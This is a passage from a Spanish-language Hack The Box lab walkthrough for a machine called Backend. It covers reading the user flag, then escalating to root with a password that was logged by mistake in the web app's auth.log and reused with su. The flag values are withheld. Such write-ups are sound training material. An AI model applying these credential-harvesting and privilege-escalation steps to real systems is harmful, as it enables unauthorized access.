To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@backend:~/uhc$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al servidor, ahora se puede buscar la user flag.
~~~bash
htb@backend:~/uhc$ cd ..
htb@backend:~$ ls
uhc  user.txt
htb@backend:~$ cat user.txt
<Encuentre su propia user flag>
~~~

---
## Escalada de Privilegios
Primeramente realize una enumeración exhaustiva, mostrando los permisos sudo, SUID, capabilities y demas, no encontrando algo posiblemente aprovechable, olvidandome de primero realizar una enumeracion manual de cosas que podria encontrar como el usuario "htb".
Asi que enumerando los archivos posiblemente utiles, encontre el archivo "auth.log" dentro de la carpeta donde se esta hosteando la aplicación web.
~~~bash
htb@backend:~/uhc$ cat auth.log 
11/30/2025, 23:36:47 - Login Success for admin@htb.local
11/30/2025, 23:40:07 - Login Success for admin@htb.local
11/30/2025, 23:53:27 - Login Success for admin@htb.local
11/30/2025, 23:56:47 - Login Success for admin@htb.local
12/01/2025, 00:01:47 - Login Success for admin@htb.local
12/01/2025, 00:05:07 - Login Success for admin@htb.local
12/01/2025, 00:18:27 - Login Success for admin@htb.local
12/01/2025, 00:26:47 - Login Success for admin@htb.local
12/01/2025, 00:28:27 - Login Success for admin@htb.local
12/01/2025, 00:35:07 - Login Success for admin@htb.local
12/01/2025, 00:43:27 - Login Failure for Tr0ub4dor&3
12/01/2025, 00:45:02 - Login Success for admin@htb.local
12/01/2025, 00:45:07 - Login Success for admin@htb.local
12/01/2025, 00:45:27 - Login Success for admin@htb.local
12/01/2025, 00:46:47 - Login Success for admin@htb.local
12/01/2025, 00:51:47 - Login Success for admin@htb.local
12/01/2025, 00:58:27 - Login Success for admin@htb.local
12/01/2025, 01:33:55 - Login Failure for res
12/01/2025, 01:44:09 - Login Success for test@test.com
12/01/2025, 02:29:50 - Login Success for admin@htb.local
12/01/2025, 08:13:50 - Login Success for test@test.com
~~~
En esta se ve  que el usuario "admin" se logueo varias veces, pero en dos campos parece que se confundio, podria ser que ingreso la contraseña en lugar del correo, asi que intento probar como contraseña del usuario "htb".
~~~bash
htb@backend:~/uhc$ sudo -l
[sudo] password for htb: 
Sorry, try again.
~~~
Esto no funciona, pero siempre es bueno probar todas las contraseñas incluso para el usuario root.
~~~bash
htb@backend:~/uhc$ su
Password: 
root@backend:/home/htb/uhc#
~~~
Esto si funciono, no lo veo muy real pero htb con sus maquinas.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso como root a la maquina, ya se puede leer la root flag sin problema.
~~~
root@backend:/home/htb/uhc# cd /root
root@backend:~# ls
root.txt
root@backend:~# cat root.txt
<Encuentre su propia root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido



















